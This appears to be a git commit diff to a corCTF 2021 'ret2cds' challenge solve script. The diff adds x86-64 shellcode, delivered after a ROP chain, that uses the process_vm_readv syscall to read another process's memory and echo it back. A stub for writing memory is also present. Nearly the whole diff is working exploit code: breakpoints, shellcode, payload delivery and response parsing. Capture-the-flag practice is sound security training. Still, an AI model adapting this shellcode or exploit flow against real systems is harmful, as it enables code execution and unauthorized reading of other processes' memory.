4397e2bbb2af107e0097cc6da0455ef86e5199a2
Brian Welch <welch18@vt.edu>
2021-08-21 20:45:01 -0400

    Add initial version of process_vm_readv shellcode for ret2cds

--- writeups/2021/corCTF/ret2cds/chall/solve.py
+++ writeups/2021/corCTF/ret2cds/chall/solve.py
@@ -19,18 +19,14 @@ else:
 if args.GDB:
     gdb.attach(io, f"""
         file {the_binary}
-        break *0x4012b9
-        ignore 1 1
+        break *0x4012ba
+        ignore 1 2
+
+        # set breakpoint pending on
+        # break *0xdead0000
+
         continue
     """)
-
-class Const:
-    rip_offset = 0x108
-
-    mmap_base = 0xdead0000
-    iovec_read = 0xdead1000
-    iovec_write = 0xdead2000
-    mmap_size = 0x3000
 
 def libc_off(offset):
     return libc.address + offset
@@ -82,10 +78,151 @@ class Gadgets:
     def syscall(self):
         return libc_off(0x0000000000066229)
 
-shellcode = "\n".join([
-    shellcraft.echo("\n\nIt's working...\n\n\n"),
-])
-shellcode = asm(shellcode)
+class Const:
+    rip_offset = 0x108
+
+    SYS_process_vm_readv = 310
+    SYS_process_vm_writev = 311
+
+    mmap_base = 0xdead0000
+    iovec_local = 0xdead3000
+    iovec_remote = 0xdead6000
+    iovec_size = 0x3000
+    mmap_size = 0x9000
+
+    hello_msg = "hello"
+    msg_prologue = "__mbegin__"
+    msg_epilogue = "__mend__"
+    process_read_err = "pread err"
+    process_write_err = "pwrite err"
+
+    cds_rwx_base = 0x800000000
+    cds_rwx_size = 0x2000
+
+shellcode = f"""
+    jmp do_it
+
+hello_msg:
+    .string "{Const.hello_msg}"
+    .byte 0
+process_read_err:
+    .string "{Const.process_read_err}"
+    .byte 0
+process_write_err:
+    .string "{Const.process_write_err}"
+    .byte 0
+msg_prologue:
+    .string "{Const.msg_prologue}"
+    .byte 0
+msg_epilogue:
+    .string "{Const.msg_epilogue}"
+    .byte 0
+
+do_it:
+    lea rdi,[rip+hello_msg]
+    mov rsi,{len(Const.hello_msg)}
+    call echo_msg
+
+    mov rdi,675
+    mov rsi,0xdeadbeef
+    mov rdx,0x2000
+    call read_process_mem
+
+    call exit
+
+/* Args:
+    - rdi: Address holding the data to print.
+    - rsi: Length of data to print.
+*/
+echo_data:
+    mov rdx,rsi
+    mov rsi,rdi
+    mov rdi,STDOUT_FILENO
+    mov rax,SYS_write
+    syscall
+    ret
+
+echo_prologue:
+    lea rdi,[rip+msg_prologue]
+    mov rsi,{len(Const.msg_prologue)}
+    call echo_data
+    ret
+
+echo_epilogue:
+    lea rdi,[rip+msg_epilogue]
+    mov rsi,{len(Const.msg_epilogue)}
+    call echo_data
+    ret
+
+/* Same as echo_data, but prepends and appends a message prologue/epilogue. */
+echo_msg:
+    push rdi
+    push rsi
+    call echo_prologue
+    pop rsi
+    pop rdi
+    call echo_data
+    call echo_epilogue
+    ret
+
+/* Args:
+    - rdi: PID of process whose memory to read.
+    - rsi: Memory address to read from
+    - rdx: Length of region to read
+   Read data is placed into the iovec_local region.
+*/
+read_process_mem:
+    mov rcx,rsi
+    mov rbx,rdx
+    /* Setup local iovec, indicating where to write the data read from the
+      remote process. */
+    mov rsi,{hex(Const.iovec_local)}
+    mov dword ptr [rsi+0],{hex(Const.iovec_local+0x10)}
+    mov [rsi+8],rbx
+    mov rdx,1
+    /* Setup remote iovec, indicating where we want to read from in the remote
+       process. */
+    mov r10,{hex(Const.iovec_remote)}
+    mov [r10+0],rcx
+    mov [r10+8],rbx
+    mov r8,1
+    /* No flags. */
+    mov r9,0
+    /* Do the syscall. */
+    mov rax,{Const.SYS_process_vm_readv}
+    syscall
+    /* rax now holds how many bytes were read from the remote process memory,
+       or -1 on error. */
+    cmp rax,0
+    jle read_process_mem_err
+    /* No error, write the process memory back to ourselves. */
+    mov rdi,{hex(Const.iovec_local+0x10)}
+    mov rsi,rax
+    call echo_msg
+    ret
+read_process_mem_err:
+    lea rdi,[rip+process_read_err]
+    mov rsi,{len(Const.process_read_err)}
+    call echo_msg
+    ret
+
+/* TODO: we may need to read() in from this script to determine what we 
+         want to write */
+write_process_mem:
+    nop
+    ret
+
+exit:
+    mov rax,SYS_exit
+    syscall
+"""
+shellcode = asm(shellcode, vma=Const.mmap_base)
+log.info("Shellcode length: %i" % len(shellcode))
+
+def recv_shellcode_msg():
+    io.recvuntil(Const.msg_prologue)
+    msg = io.recvuntil(Const.msg_epilogue, drop=True) 
+    return msg
 
 g = Gadgets()
 
@@ -178,4 +315,12 @@ do_rop(
 
 sleep(2)
 io.send(shellcode)
+
+msg = recv_shellcode_msg()
+assert msg.decode() == Const.hello_msg
+log.info("Got hello message from shellcode...")
+
+msg = recv_shellcode_msg()
+print(msg)
+
 io.interactive()
